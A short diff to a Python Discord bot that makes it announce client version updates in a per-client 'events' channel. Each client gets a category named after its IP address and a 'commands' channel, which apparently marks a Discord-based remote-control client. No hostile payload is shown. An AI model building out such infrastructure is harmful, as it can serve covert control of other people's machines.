@@ -110,6 +110,15 @@ async def on_ready():
             await guild.create_text_channel("events", category=category)
             await guild.create_text_channel("commands", category=category)
         if existing_category:
+            with open("update.txt") as up:
+                tex = up.read()
+                up.close()
+            if not tex == "":
+                category = nextcord.utils.get(guild.categories, name=str(ip))
+                channel5 = nextcord.utils.get(category.text_channels, name="events")
+                await channel5.send(f"Client updated to version v{tex}")
+                with open("update.txt", "w") as up:
+                    up.write("")
             await channel12.send(f"Client {ip} online!")
             category = nextcord.utils.get(guild.categories, name=str(ip))
             if category:
